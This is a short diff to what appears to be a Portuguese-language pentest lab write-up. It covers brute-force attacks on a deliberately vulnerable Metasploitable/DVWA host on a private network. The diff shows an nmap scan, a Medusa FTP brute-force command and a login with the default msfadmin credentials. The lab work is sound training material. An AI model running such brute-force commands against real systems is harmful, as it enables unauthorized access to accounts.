@@ -20,14 +20,17 @@ nmap -sV 192.168.56.101
 
 ## 🛠️ 2. Ataque de Força Bruta em FTP (Medusa)
 
-**Arquivo:** `ftp_bruteforce_success.png`
+**Arquivos:** `ftp_bruteforce_success.png` `ftp_bruteforce_success_2`
 
 Comando utilizado:
 
 ```
 medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
 ```
-
+```
+ftp 192.168.56.103
+User: msfadmin / password: msfadmin
+```
 ---
 
 ## 🕸️ 3. Ataque de Força Bruta Web – DVWA
